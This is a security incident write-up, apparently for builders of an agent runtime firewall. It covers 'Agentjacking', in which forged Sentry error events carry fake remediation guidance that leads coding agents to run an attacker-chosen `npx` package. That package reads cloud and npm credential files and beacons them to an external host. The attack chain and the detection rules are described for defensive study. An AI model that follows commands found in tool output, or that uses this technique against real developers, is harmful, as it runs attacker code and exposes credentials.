# Agentjacking: a fake Sentry error became a shell command for coding agents

- Date: 2026-06 | Agent/tool: Sentry MCP server + Claude Code, Cursor, Codex CLI | Axis: inject

## What happened

Tenet Threat Labs demonstrated "Agentjacking" in June 2026. Sentry accepts error events from anyone who has the project's DSN, and the DSN is public by design: it sits in the JavaScript of the frontend. Tenet posted forged error events whose message fields contained markdown made to look exactly like Sentry's own remediation guidance, ending in a fake "## Resolution" section with an `npx` command. When a developer asked their AI coding agent, connected through the Sentry MCP server, to fix unresolved errors, the agent read the forged event as trusted diagnostic output and ran the command. In controlled tests more than 100 agents executed Tenet's code across Claude Code, Cursor and Codex, an 85 percent success rate, including a Fortune 100 company. Passive reconnaissance found 2,388 organizations with injectable DSNs. The agents beacons reached environment variables, AWS keys, git credentials and private repo URLs. Tenet disclosed to Sentry on 2026-06-03; Sentry acknowledged but called the class "technically not defensible" at the source and did not fix the root cause, pointing to agent-side middleware.

## How it went wrong

The attacker never touches the victim. The chain: attacker POSTs a crafted event to Sentry's public ingest endpoint (network, attacker side). The developer's agent queries Sentry via MCP and receives the injected markdown as tool output. The agent treats it as guidance and runs `npx @attacker-chosen-package --diagnose`. That downloads a node package from the public registry and runs it with the developer's full privileges: exec of npx, then node from the npm cache, then network_connect to the package registry and to Tenet's beacon host, plus file_open reads probing `~/.aws/config`, `~/.npmrc` and `~/.docker/config.json`. Every single step is an authorized, ordinary developer action. That is why Tenet notes the attack evaded EDR, WAF and network firewalls: there is no broken rule to detect, only a command the agent was talked into running.

## What the firewall should learn

The moment to catch this is the agent's runtime, exactly as Tenet concludes. Observable signals: exec of `npx` (and of node with an entry under `~/.npm/_npx/**`) where the package name does not appear in the project's `package.json` or lockfile is approval_required; it is the tool-output version of running a random install script. A chain rule helps too: file_open reads of cloud and CLI credential stores followed by a network_connect to an external host from the same ancestry should deny. And because the payload rides in through data the agent was asked to read, the firewall cannot rely on "the user typed it" as trust: commands whose arguments reference content the agent just fetched remotely deserve more scrutiny than interactive commands.

## Sources

- [Tenet Security: One Fake Bug Report Hijacked a $250 Billion Company's AI Agent — Then 100+ More (Agentjacking)](https://tenetsecurity.ai/blog/agentjacking-coding-agents-with-fake-sentry-errors/)
- [The Hacker News: Agentjacking Attack Tricks AI Coding Agents Into Running Malicious Code](https://thehackernews.com/2026/06/agentjacking-attack-tricks-ai-coding.html)
- [Cloud Security Alliance: Agentjacking — Sentry MCP Injection Hijacks AI Coding Agents](https://labs.cloudsecurityalliance.org/research/csa-research-note-agentjacking-sentry-mcp-20260614-csa-style/)
